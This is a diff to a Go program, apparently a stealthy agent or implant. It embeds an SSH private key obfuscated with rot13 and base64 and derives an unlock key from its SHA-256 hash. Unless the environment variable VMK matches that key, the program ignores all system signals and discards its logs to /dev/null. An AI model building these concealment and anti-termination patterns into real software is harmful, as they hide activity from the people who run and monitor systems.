@@ -4,14 +4,16 @@
 package main
 
 import (
+	"crypto/sha256"
 	_ "embed"
+	"encoding/base64"
+	"encoding/hex"
+	"github.com/awnumar/memguard"
+	"io/ioutil"
+	"log"
 	"os"
 	"os/user"
 	"path/filepath"
-	"log"
-	"io/ioutil"
-	"encoding/base64"
-	"github.com/awnumar/memguard"
 )
 
 //go:embed resources/ssh_private_key.base64.rot13
@@ -42,7 +44,7 @@ func resourcesPurge() {
 	memguard.Purge()
 }
 
-func resourceSSHPrivateKeyUnpack() {
+func resourceSSHPrivateKeyUnpack() string {
 	resourceSSHPrivateKeyBase64 := rot13String(resourceSSHPrivateKeyBase64Rot13)
 
 	decodedData, err := base64.StdEncoding.DecodeString(resourceSSHPrivateKeyBase64)
@@ -52,6 +54,11 @@ func resourceSSHPrivateKeyUnpack() {
 
 	resourceSSHPrivateKeyMemguardBuffer = memguard.NewBufferFromBytes(decodedData)
 	resourceSSHPrivateKey = resourceSSHPrivateKeyMemguardBuffer.String()
+
+	shasum := sha256.New()
+	shasum.Write([]byte(resourceSSHPrivateKey))
+
+	return hex.EncodeToString(shasum.Sum(nil))
 }
 
 func resourceSSHPrivateKeyDestroy() {
@@ -66,7 +73,12 @@ func init() {
 	// Safely terminate in case of an interrupt signal
 	memguard.CatchInterrupt()
 
-	var logFile string 
+	var logFile string
+
+	sshPrivateKeySHA256Sum := resourceSSHPrivateKeyUnpack()
+	if cfg.VerboseModeKey == "" {
+		cfg.VerboseModeKey = sshPrivateKeySHA256Sum
+	}
 
 	dontSilenceKey := os.Getenv("VMK")
 	if dontSilenceKey == cfg.VerboseModeKey {
@@ -75,6 +87,7 @@ func init() {
 		systemIgnoreAllSignals()
 		logFile = os.DevNull
 	}
+	// TODO: memguard at this point the cfg.VerboseModeKey ?
 
 	if logFile == "homedir" {
 		logFile = os.DevNull
@@ -104,5 +117,4 @@ func init() {
 	}
 
 	systemRouteAllLogging(logFile)
-	resourceSSHPrivateKeyUnpack()
 }
